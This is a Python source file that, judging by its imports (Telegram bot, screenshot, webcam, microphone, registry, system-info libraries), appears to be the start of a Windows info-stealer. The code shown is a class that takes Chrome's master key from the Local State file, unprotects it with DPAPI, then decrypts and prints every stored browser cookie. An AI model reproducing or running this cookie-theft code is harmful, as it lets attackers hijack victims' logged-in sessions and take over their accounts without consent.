import os
import base64
import shutil
import sqlite3
import json
import tempfile
import zipfile
import requests
import telebot
import socket
import platform
import psutil
import subprocess
import pyautogui
import cv2
import GPUtil
import pyaudio
import winreg
import time
import wmi
import cpuinfo
import threading
import chrome_cookies

import win32crypt
from Cryptodome.Cipher import AES


class Cookies:
    def __init__(self):
        self.local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data\Local State")
        self.cookies_db_path = os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data\Default\Network\Cookies")

        if not os.path.exists(self.local_state_path):
            raise FileNotFoundError(f"Local State file not found: {self.local_state_path}")

        if not os.path.exists(self.cookies_db_path):
            raise FileNotFoundError(f"Cookies database file not found: {self.cookies_db_path}")

        self.secret_key = self.get_secret_key()

    def get_secret_key(self):
        try:
            with open(self.local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print(f"Error getting secret key: {e}")
            return None

    def decrypt_password(self, ciphertext):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            auth_tag = ciphertext[-16:]
            cipher = AES.new(self.secret_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt_and_verify(encrypted_password, auth_tag)
            return decrypted_pass.decode()
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return None

    def get_cookies(self):
        cookies = []
        try:
            conn = sqlite3.connect(self.cookies_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")

            for host_key, name, path, encrypted_value in cursor.fetchall():
                decrypted_value = self.decrypt_password(encrypted_value)
                if decrypted_value:
                    cookies.append({
                        'host': host_key,
                        'name': name,
                        'path': path,
                        'value': decrypted_value
                    })

            conn.close()
        except Exception as e:
            print(f"Error getting cookies: {e}")
        return cookies

    def view_cookies(self):
        cookies = self.get_cookies()
        for cookie in cookies:
            print(f"Host: {cookie['host']}, Name: {cookie['name']}, Path: {cookie['path']}, Value: {cookie['value']}")
